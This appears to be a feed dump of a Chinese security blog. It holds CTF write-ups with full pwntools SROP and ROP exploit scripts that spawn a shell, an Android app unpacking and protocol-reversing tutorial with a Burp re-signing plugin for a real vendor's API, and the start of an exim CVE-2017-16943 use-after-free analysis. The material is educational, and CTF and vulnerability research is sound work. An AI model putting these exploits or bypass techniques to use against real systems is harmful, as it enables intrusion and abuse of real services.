<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div></pre></td></tr></table></figure>
<p>然后就是 <code>srop</code> 了。首先使用 <code>srop</code> 修改 <code>rsp</code>到 我们 一个刚刚泄露的地址.设置好 <code>/bin/sh</code>, 这么做的原因是，在一个确定地址处设置好 <code>/bin/sh</code>，用于后面 <code>getshell</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185188140sj1uelb.png?imageslim" alt="paste image"></p>
<p>然后又回到开头，设置 <code>SigreturnFrame</code>, 此时已经可以确定<code>/bin/sh</code> 的地址了。设置好 寄存器。<code>srop</code>之后，再次 <code>syscall</code> 执行<br><code>execve(“/bin/sh”, 0, 0)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185607335pktg6kj.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>很多东西调试一遍就清楚了。调试 <code>exp</code>, 写一点就调试一点。<code>srop</code> 时 ,栈顶开始为 <code>SigreturnFrame</code>.</p>
<p>参考：</p>
<p><a href="http://blog.csdn.net/qq_29343201/article/details/72627439" target="_blank" rel="external">http://blog.csdn.net/qq_29343201/article/details/72627439</a></p>
<p>完整的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from time import sleep</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line">p = process(&quot;./smallest&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"># bp *0x004000BE </div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># pause()</div><div class="line"></div><div class="line"></div><div class="line"># swtch rsp ---&gt; to leak addr, for get /bin/sh addr</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = again    # ret to begin</div><div class="line">payload = p64(again)</div><div class="line">payload += &apos;d&apos; * 8</div><div class="line">payload += str(frame)</div><div class="line"></div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">syscall_addr = 0x04000BE </div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line"></div><div class="line">pause()</div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">log.info(&quot;switch stack done&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += &quot;B&quot; * 8</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = syscall_addr    # ret to begin</div><div class="line"></div><div class="line">frame.rax = 59</div><div class="line"></div><div class="line">frame.rdi = stack_addr + 0x10 + 0xf8</div><div class="line"></div><div class="line">payload += str(frame)</div><div class="line">payload += &quot;/bin/sh\x00&quot;</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> srop </tag>
            
            <tag> rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[syscall to rop]]></title>
      <url>/2017/12/16/syscall_to_rop.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>hitcon 2017</code> 的 <code>start</code> 题，比较简单，练练手。</p>
<p>题目链接：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/hitcon2017" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/hitcon2017</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405464132pvttkl9d.png?imageslim" alt="paste image"></p>
<p>往 <code>rbp-0x20</code> 读入 <code>0xd9</code> 的数据，溢出。<br>程序开了 <code>cancary</code> ，又后面直接 <code>puts</code> 把我们输入的打印出来</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405574819gtyg37m3.png?imageslim" alt="paste image"></p>
<p>我们可以直接溢出到 <code>cancary</code>, 然后用 <code>puts</code> 泄露 <code>cancary</code>， 这里有个小 <code>tips</code> , <code>cancary</code> 的最低位 为 <code>\x00</code>, 我们需要多多溢出一个 字节，覆盖掉这个 <code>\x00</code>, 这样才能 泄露 <code>cancary</code>。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134057198437r3x6q4n.png?imageslim" alt="paste image"><br>拿到 <code>cancary</code> 后就是正常的 <code>rop</code> 了，直接使用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary ./start --ropchain</div></pre></td></tr></table></figure>
<p>生成 <code>rop</code> 链，不过此时的 <code>rop</code> 链太长，我们需要改一改。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405845676igvlyleg.png?imageslim" alt="paste image"></p>
<p>后面用来大量的  <code>add</code> 来设置 <code>rax</code> 设置后面的 <code>syscall</code> 的系统调用号。最后调用 <code>execve(“/bin//sh”, 0, 0)</code>, 把这一大串直接用前面找到的 <code>gadgets</code> 替换掉即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134060054129ceaklcy.png?imageslim" alt="paste image"><br>长度刚好。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>rop</code> 没必要一个一个手撸， 改改生成的就行，然后就是 <code>send</code> 之间一定要 <code>sleep</code> ,要不然玄学……</p>
<p>完整exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># encoding: utf-8</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">from struct import pack</div><div class="line">import time</div><div class="line"></div><div class="line"># Padding goes here</div><div class="line">p = &apos;&apos;</div><div class="line"></div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc080) # @ .data</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret</div><div class="line">p += &apos;/bin//sh&apos;</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x4141414141414141) # padding</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x4141414141414141) # padding</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x000000000042732f) # xor rax, rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004005d5) # pop rdi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc080) # @ .data</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000443776) # pop rdx ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line"></div><div class="line">p += p64(0x000000000047a6e6)</div><div class="line">p += p64(59)</div><div class="line">p += p64(0)</div><div class="line">p += p64(0)</div><div class="line">p += p64(0x0000000000468e75)</div><div class="line"></div><div class="line"></div><div class="line">print(hex(len(p)))</div><div class="line"></div><div class="line">print hex(len(p))</div><div class="line">rop = p</div><div class="line"></div><div class="line">r  = process(&quot;./start&quot;)</div><div class="line"># gdb.attach(r, &apos;&apos;&apos;</div><div class="line"># # bp *0x0400B5C</div><div class="line"># bp *0x0400B96</div><div class="line"># c</div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"># it could send &quot;b&quot; *0x18 + &quot;\n&quot;</div><div class="line">r.sendline(&quot;b&quot; * ( 0x20 - 0x8 ))</div><div class="line"></div><div class="line">time.sleep(0.2)</div><div class="line">r.recvuntil(&quot;b&quot; * ( 0x20 - 0x8 ))</div><div class="line">r.recv(1)</div><div class="line">cancary = u64(&quot;\x00&quot; + r.recv(7))</div><div class="line"></div><div class="line">log.info(&quot;get cancary: &quot; + hex(cancary))</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = &quot;exit\n\x00&quot;</div><div class="line">payload += &quot;b&quot; * ( 0x20 - 0x8 - len(payload))  # padding for cancary</div><div class="line">payload += p64(cancary)</div><div class="line">payload += &quot;A&quot; * 8  # padding for ret </div><div class="line">payload += rop    # rip</div><div class="line"></div><div class="line"></div><div class="line">print hex(len(payload))</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">time.sleep(0.2)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安卓脱壳&&协议分析&&burp辅助分析插件编写]]></title>
      <url>/2017/12/15/legu_android_readboy_burp.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>本文以一个 <code>app</code> 为例，演示对 <code>app</code>脱壳，然后分析其 协议加密和签名方法，然后编写 <code>burp</code> 脚本以方便后面的测试。</p>
<p>文中涉及的文件，脱壳后的 dex 都在：</p>
<p>链接: <a href="https://pan.baidu.com/s/1nvmUdq5" target="_blank" rel="external">https://pan.baidu.com/s/1nvmUdq5</a> 密码: isrr</p>
<p>对于 burp 扩展和后面加解密登录数据包工具的的源码，直接用 <code>jd-gui</code> 反编译 <code>jar</code> 包即可。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先下载目标 <code>apk</code> ，然后拖到 <code>GDA</code> 里面看看有没有壳。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337474227b39j3jxc.png?imageslim" alt="paste image"></p>
<p>发现是腾讯加固，可以通过修改 <code>dex2oat</code> 的源码进行脱壳。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337565769bn64zn4n.png?imageslim" alt="paste image"></p>
<p>具体可以看: <a href="https://bbs.pediy.com/thread-210275.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-210275.htm</a></p>
<p>脱完壳 <code>dex</code>文件，扔到 <code>jeb</code> 里面进行分析（GDA分析能力还是不太强，不过速度快）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513337779278qey46atq.png?imageslim" alt="paste image"></p>
<p>类和方法都出来了，脱壳成功。</p>
<p>首先看看协议抓取，建议自己电脑起一个 <code>ap</code> （热点）， 然后用手机连接热点，对于 <code>http</code> 的数据包，可以使用 <code>burp</code> 进行抓取（对于 <code>https</code> 还要记得先安装 <code>burp</code> 的证书），对于 <code>tcp</code> 的数据包，由于我们是连接的 电脑的 <code>wifi</code> 所以我们可以直接用 <code>wireshark</code> 抓取我们网卡的数据包就能抓到手机的数据包。对于笔记本，可以买个无线网卡。</p>
<p>首先看看注册数据包的抓取，设置好代理，选择注册功能，然后去 <code>burp</code> 里面，可以看到抓取的数据包。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513338240458s36epujq.png?imageslim" alt="paste image"></p>
<p>对于登录数据包，点击登录功能，去发现 <code>burp</code> 无法抓到数据包， 怀疑使用了 <code>tcp</code> 发送请求数据，于是开启 <code>wireshark</code> 抓取 手机连接的热点到的网卡的数据包。抓取时间要短一些，不然找信息就很麻烦了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341008341rq8wpav3.png?imageslim" alt="paste image"></p>
<p>然后我们一个一个 <code>tcp</code> 数据包查看，看看有没有什么特殊的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341090053skcv5yui.png?imageslim" alt="paste image"><br>发现一个数据包里面有 <code>base64</code> 加密的数据，猜测这个应该就是登陆的数据包。查了一下 <code>ip</code> ，应该就是了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341353754c2w3pkwy.png?imageslim" alt="paste image"></p>
<p>下面针对不同类型的协议加密措施进行分析。</p>
<p><strong>HTTP协议</strong></p>
<p>协议分析关键是找到加密解密的函数，可以使用关键字搜索定位。为了方便搜索，先把 <code>dex</code> 转成 <code>smali</code> 然后用文本搜索工具搜索就行了，我使用 <code>android killer</code>。在这里可以使用 <code>sn</code> ， <code>verify</code> 等关键词进行搜索，定位关键代码。我选择了  <code>verify</code> ，因为它搜出的结果较少。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341792672zmzhh519.png?imageslim" alt="paste image"><br>函数没经过混淆，看函数名就可以大概猜出了作用，找到关键方法，拿起 <code>jeb</code> 分析之。<br>先来看看 <code>LoginReg2_Activity</code> 的 <code>onCreate</code> 方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513341951766jsqhhzy2.png?imageslim" alt="paste image"></p>
<p>获取手机号进入了 <code>XHttpApi.getVerify</code> 方法，跟进</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/151334205737726n8kfgz.png?imageslim" alt="paste image"><br>先调用了 <code>XHttpApi.addSnToParams(params)</code> （看名称估计他就是增加签名的函数了），然后发送 <code>post</code> 请求。</p>
<p>继续跟进 <code>XHttpApi.addSnToParams</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133421932295dvpmsnb.png?imageslim" alt="paste image"><br>至此签名方案非常清晰了。</p>
<ul>
<li>获取时间戳,新增一个 <code>t</code> 的参数，值为 时间戳</li>
<li><code>md5(&quot;AndroidWear65cbcdeef24de25e5ed45338f06a1b37&quot; + time_stamp)</code> 为 <code>sn</code></li>
</ul>
<p>由于有时间戳和签名的存在，而且服务器会检测时间戳，后续如果我们想测试一些东西，就需要过一段时间就要计算一下 签名和时间戳，这样非常麻烦，我们可以使用 <code>burp</code> 编写插件，自动的修改 时间戳和 签名，这样可以大大的减少我们的工作量。</p>
<p>看看关键的源代码</p>
<p>首先注册一个 <code>HttpListener</code>, 这样 <code>burp</code> 的流量就会经过我们的扩展。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513342650132r1v1tcbd.png?imageslim" alt="paste image"><br>然后看看 <code>processHttpMessage</code>对流经扩展的流量进行处理的逻辑。只处理 <code>http</code> 请求的数据，然后根据域名过滤处理的数据包，只对 <code>wear.readboy.com</code> 进行处理。接着对于数据包中的 <code>t</code> 参数和 <code>sn</code> 参数进行重新计算，并且修改 数据包中的对应值。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513342872069y1xwfms2.png?imageslim" alt="paste image"><br>加载扩展，以后重放数据包，就不用管签名的问题了。</p>
<p><strong>TCP</strong></p>
<p>对于 <code>tcp</code> 的协议可以通过搜索 端口号，<code>ip</code> 地址等进行定位，这里搜索 <code>端口号</code>（这里是<code>8866</code>, 可以在 <code>wireshark</code> 中查看），有一点要注意，程序中可能会用 <code>16</code> 进制或者 <code>10</code> 进制表示端口号为了，保险起见建议两种表示方式都搜一下。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343281055sjrlbm36.png?imageslim" alt="paste image"></p>
<p>通过搜索 <code>0x22a2</code> （<code>8866</code> 的 <code>16</code> 进制表示）找到两个可能的位置。分别检查发现 第二个没啥用，在 <code>jeb</code> 中查找交叉引用都没有，于是忽略之。然后看看第一个。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343724882zalp55el.png?imageslim" alt="paste image"><br>可以看到 <code>jeb</code> 把端口号都转成了 <code>10</code> 进制数，这里与服务器进行了连接，没有什么有用的信息。于是上下翻翻了这个类里面的函数发现一个有意思的函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15133438596375b7az3lq.png?imageslim" alt="paste image"><br>用于发送数据，里面还用了另外一个类的方法，一个一个看，找到了加密方法。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1513343943270gionovo1.png?imageslim" alt="paste image"></p>
<p>就是简单的 <code>rc4</code> 加密，然后在 <code>base64</code> 编码。<br>为了测试的方便写了个图形化的解密软件。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513344074547va5a339l.png?imageslim" alt="paste image"></p>
<p>用 <code>nc</code> 测试之</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513344169166j8m5j980.png?imageslim" alt="paste image"><br>正确。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>不要怕麻烦，一些东西尽早脚本化，自动化，减轻工作量。逆向分析，搜索关键字，定位关键代码。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.vuln.cn/6100" target="_blank" rel="external">http://www.vuln.cn/6100</a></p>
<p><a href="http://www.freebuf.com/articles/terminal/106673.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/106673.html</a></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> protocol analysis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[exim CVE-2017-16943 uaf漏洞分析]]></title>
      <url>/2017/12/14/exim_CVE_2017_16943_uaf_pwn.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>这是最近爆出来的 <code>exim</code> 的一个 <code>uaf</code> 漏洞，可以进行远程代码执行。本文对该漏洞和作者给出的 <code>poc</code> 进行分析。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>环境搭建</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># 从github上拉取源码</div><div class="line">$ git clone https://github.com/Exim/exim.git</div><div class="line"># 在4e6ae62分支修补了UAF漏洞，所以把分支切换到之前的178ecb：</div><div class="line">$ git checkout ef9da2ee969c27824fcd5aed6a59ac4cd217587b</div><div class="line"># 安装相关依赖</div><div class="line">$ apt install libdb-dev libpcre3-dev</div><div class="line"># 获取meh提供的Makefile文件，放到Local目录下，如果没有则创建该目录</div><div class="line">$ cd src</div><div class="line">$ mkdir Local</div><div class="line">$ cd Local</div><div class="line">$ wget &quot;https://bugs.exim.org/attachment.cgi?id=1051&quot; -O Makefile</div><div class="line">$ cd ..</div><div class="line"># 修改Makefile文件的第134行，把用户修改为当前服务器上存在的用户，然后编译安装</div><div class="line">$ make &amp;&amp; make install</div></pre></td></tr></table></figure>
<p>注：</p>
<p><em>如果要编译成 <code>debug</code> 模式，在 <code>Makefile</code> 找个位置 加上 <code>-g</code> 。（比如 <code>CFLAGS</code>, 或者 <code>gcc</code> 路径处）</em></p>
<p>安装完后 ,修改 <code>/etc/exim/configure</code> 文件的第 <code>364</code> 行，把 <code>accept hosts = :</code> 修改成 <code>accept hosts = *</code></p>
<p>然后使用 <code>/usr/exim/bin/exim -bdf -d+all</code> 运行即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513257523377oq8q35os.png?imageslim" alt="paste image"></p>
<p><strong>漏洞分析</strong></p>
<p>首先谈谈 <code>exim</code> 自己实现的 <code>堆管理</code> 机制.相关代码位于 <code>store.c</code>.<br>其中重要函数的作用</p>
<ul>
<li><code>store_get_3</code> : 分配内存</li>
<li><code>store_extend_3</code>: 扩展堆内存</li>
<li><code>store_release_3</code>: 释放堆内存</li>
</ul>
<p><code>exim</code> 使用 <code>block pool</code> 来管理内存。其中共有 3 个 <code>pool</code>,以枚举变量定义.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">enum &#123; POOL_MAIN, POOL_PERM, POOL_SEARCH &#125;;</div></pre></td></tr></table></figure></p>
<p>程序则通过 <code>store_pool</code> 来决定使用哪个 <code>pool</code> 来分配内存。不同的 <code>pool</code> 相互独立。</p>
<p>有一些全局变量要注意。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">//管理每个 block 链表的首节点</div><div class="line">static storeblock *chainbase[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// 每一项是所属 pool中,目前提供的内存分配的 current_block 的指针</div><div class="line">// 即内存管理是针对 current_block 的。</div><div class="line">static storeblock *current_block[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// current_block 空闲内存的起始地址。每一项代表每一个</div><div class="line">// pool 中的 current_block 的相应值</div><div class="line">static void *next_yield[3] = &#123; NULL, NULL, NULL &#125;;</div><div class="line"></div><div class="line">// current_block 中空闲内存的大小， 每一项代表每一个</div><div class="line">// pool 中的 current_block 的相应值</div><div class="line">static int yield_length[3] = &#123; -1, -1, -1 &#125;;</div><div class="line"></div><div class="line">// 上一次分配获得的 内存地址</div><div class="line">//每一项代表每一个pool 中的 current_block 的相应值</div><div class="line">void *store_last_get[3] = &#123; NULL, NULL, NULL &#125;;</div></pre></td></tr></table></figure>
<p><code>block</code> 的结构<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15132607491657xt9urak.png?imageslim" alt="paste image"></p>
<p>每一个 <code>pool</code> 中的 <code>block</code>通过 <code>next</code> 指针链接起来</p>
<p>大概的结构图如下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513262786424ik0joztb.png?imageslim" alt="paste image"></p>
<p><code>block</code> 的 <code>next</code> 和 <code>length</code> 域以下（偏移 <code>0x10</code>（64位）），用于内存分配（<code>0x2000</code> 字节）。</p>
<p>先来看看 <code>store_get_3</code>，该函数用于内存请求。<br>首次使用会先调用 <code>store_malloc</code> 使用 系统的 <code>malloc</code> 分配 <code>0x2000</code> 大小内存块，这也是 <code>block</code> 的默认大小，并将这个内存块作为 <code>current_block</code> 。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15132593592238uznra2a.png?imageslim" alt="paste image"></p>
<p>如果 <code>block</code> 中的剩余大小足够的话，通过调整 <code>next_yield</code>, <code>yield_length</code>, <code>store_last_get</code>直接切割内存块，然后返回 <code>store_last_get</code> 即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513259525324mnzqf4wm.png?imageslim" alt="paste image"></p>
<p>如果 <code>block</code> 中的内存不够，就用 <code>store_malloc</code> 另外分配一块，并将这个内存块作为 <code>current_block</code>，然后再进行切割。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513259887575q7snuezu.png?imageslim" alt="paste image"></p>
